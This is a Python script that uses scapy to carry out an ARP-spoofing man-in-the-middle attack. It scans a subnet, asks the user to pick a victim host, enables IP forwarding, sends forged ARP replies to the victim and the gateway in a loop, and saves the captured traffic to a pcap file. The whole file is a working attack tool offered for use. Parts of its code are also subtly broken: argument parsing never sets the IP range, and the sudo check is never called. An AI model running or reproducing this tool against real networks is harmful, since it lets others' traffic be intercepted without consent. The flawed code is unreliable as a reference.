import scapy.all as scapy
import subprocess
import sys
import time
import os
from ipaddress import IPv4Network
import threading

# Will get the current working directory 
cwd = os.getcwd()

# Function to check if the script is being runwith sudo priviledges
# If not it will stop
def in_sudo_mode():
    if not 'SUDO_UID' in os.environ.keys():
        print("Try running this program with sudo")
        exit()

def arp_scan(ip_range):
    """We use arping method in scapy
    
    ip_range->an example is 10.0.0.0/24"""

    # We create an empty list to store the pair of ARP responses.
    arp_responses=list()
    # We send the arp packets through the network, verbose is set to 0 so it wont show any output.
    # returns two lists. We are interested in the answered lists at index 0.
    answered_lst = scapy.arping(ip_range, verbose=0)[0]

    # We loop through all the responses and add them to a dictionary and append them to the list of arp_responses
    for res in answered_lst:
        arp_responses.append({"ip" : res[1].psrc, "mac" : res[1].hwsrc})
    return arp_responses

def is_gateway(gateway_ip):
    """We can see the gateway ip address by running the route -n command
    gateway_ip -> program finds should be supplied as an argument"""
    
    # Running the route -n command which returns information about gateways
    result = subprocess.run(["route", "-n"], capture_output=True).stdout.decode().split("\n")
    # Looping through every row in the route -n command
    for row in result:
        # We look to see if the gateway_ip is in the row, if it is we return True. If False program continues flow and returns False.
        if gateway_ip in row:
            return True

    return False

def get_interface_names():
    # changing directories to get interface names from /sys/class/net
    os.chdir("/sys/class/net")
    interface_names = os.listdir()
    return interface_names

def match_iface_name(row):
    #We get all interface names by running the function defined above
    interface_names  = get_interface_names()

    # Check if the interface name is in the row. If it is then we return the iface name
    for iface in interface_names:
        if iface in row:
            return iface

def gateway_info(network_info):
    # network_info -> We supply the arp_scan() data
    result = subprocess.run(["route", "-n"], capture_output=True).stdout.decode().split("\n")
    #Declaring an empty list for gateways
    gateways = []
    for iface in network_info:
        for row in result:
            if iface ["ip"] in row:
                iface_name = match_iface_name(row)
                #Once we find the gateway, we create a dictionary with all of its names.
                gateways.append({"iface" : iface_name, "ip" : iface["ip"], "mac" : iface["mac"]})
    return gateways

def clients(arp_res, gateway_res):
    """This function returns a list with only the clients. the gateway is removed from the list.
    arp_res -> The response from the ARP scan
    gateway_res -> The response from the gateway_info function."""
    # Clearing the menu so only you have access to clients whose arp tables you want to poison
    client_list = []
    for gateway in gateway_res:
        for item in arp_res:
            #All items which are not the gateway will append to the client list.
            if gateway["ip"] != item['ip']:
                client_list.append(item)
    # return the list with the clients which will be used for the menu
    return client_list


def allow_ip_forwarding():
    """Running this function allows ip forwarding. The packets will flow through your machine, and you'll be able to capture them. Otherwise user will lose connection."""

    #normally this is run sysctl -w net.ipv4.ip_forward=1 to enable ip forwarding. We run subprocess.run()
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"])
    # Load  in sysctl settings from the /etc/sysctl.conf file. 
    subprocess.run(["sysctl", "-p", "/etc/sysctl.conf"])

def arp_spoofer(target_ip, target_mac, spoof_ip):
    """This function needs to be ran twice to update the ARP tables. One time with the gateway IP and MAC, and one time with the target's IP and MAC."""

    # We would want to create an ARP response, by default op=1 which is "who-has" request, to op=2 which is an "is-at" response packet.

    # We can fool the ARP cache by sending a fake packet saying that we're at the routers ip to the target machine, and sending a packet to the router that we are at the target machine's ip.

    pkt = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(pkt, verbose=False)

def send_spoof_packets():
    # We need to send the spoof packets to the gateway and the target device.
    while True:
        # We send an ARP packet to the gateway saying that we are at the target machine.
        arp_spoofer(gateway_info["ip"], gateway_info["mac"], node_to_spoof["ip"])

        # We send ar ARP packet to the target machine saying we are gateway

        arp_spoofer(node_to_spoof["ip"], node_to_spoof["mac"], gateway_info["ip"])

        time.sleep(3)

def packet_sniffer(interface):
    """This function will be a packet sniffer to capture all the packets sent to the computer whilst the computer is the MITM"""

    # Using sniff function to sniff the packets going to the gateway interface.
    packets = scapy.sniff(iface = interface, store = False, prn = process_sniffed_pkt)

def process_sniffed_pkt(pkt):
    """A callback function that works with the packet sniffer. It reads and stores the packets in pcap file"""
    print("Writing to a pcap file. Press CTRL + C to exi.t")
    # We append every packet sniffed to the requests.pcap file which can be inspected using wireshark
    scapy.wrpcap("request.pcap", pkt, append = True)

def print_arp_res(arp_res):
    """Creating a menu"""

    print(r"""
    █──█─████─███─███─█──█
    █─█──█──█──█──█───█──█
    ██───████──█──███─████
    █─█──█─█───█────█─█──█
    █──█─█─█──███─███─█──█""")
    print("\n*********************")
    for id, res in enumerate(arp_res):
        print("{}\t\t{}\t{}".format(id,res['ip'], res['mac']))
    while True:
        try:
            #If the choice is valid then function returns the choice.
            choice = int(input("Please select the ID of the computer whose ARP cache you want to poison (CTRL + Z to exit): "))
            if arp_res[choice]:
                return choice
        
        except:
            print("Please enter a valid choice! ")

def get_cmd_arguments():
    """This function validates the command line arguments supplies at the beginning"""
    ip_range = None
    if len(sys.argv) - 1 > 0 and sys.argv[1] == "-ip_range":
        print("-ip_range flag not specified.")
        return ip_range
    elif len(sys.argv) - 1 > 0 and sys.argv[1] == "-ip_range":
        try:
            #To check if IPv4Network parameter is a valid IP range or not.
            print(f"{IPv4Network(sys.argv[2])}")
        except:
            print("Invalid command-line argument supplied.")
    return ip_range

#Checks if the program ran in sudo mode
in_sudo_mode

# Gets the ip range using the get_cmd_arguments()
ip_range = get_cmd_arguments()

if ip_range == None:
    print("No valid ip range specified.")
    exit()

# If not run then internet will be down for the user.
allow_ip_forwarding()

# Doing the arp scan. The function returnd a list of all clients.
arp_res = arp_scan(ip_range)

# Exit the script if there's no connection
if len(arp_res) == 0:
    print("No connection. Exiting, make sure devices are active or turned on.")
    exit()

# Function runs a route -n command. Returns a list with the gateway in a dictionary.
gateways = gateway_info(arp_res)

gateway_info = gateways[0]

# Gateways are removed from the clients
client_info = clients(arp_res, gateways)

#Program will exit if there are no clients

if len(client_info) == 0:
    print("No clients found when sending the ARP messages.")
    exit()

choice = print_arp_res(client_info)

# Select the node to spoof from the client_info list.
node_to_spoof = client_info[choice]

# Setup the thread in the background which will send the arp spoof packets.
t1 = threading.Thread(target=send_spoof_packets, daemon=True)

t1.start()

os.chdir(cwd)

# Run the packet sniffer on the interface. So we can capture all the packets and save it to a pcap file that can be opened in Wireshark.
packet_sniffer(gateway_info["iface"])
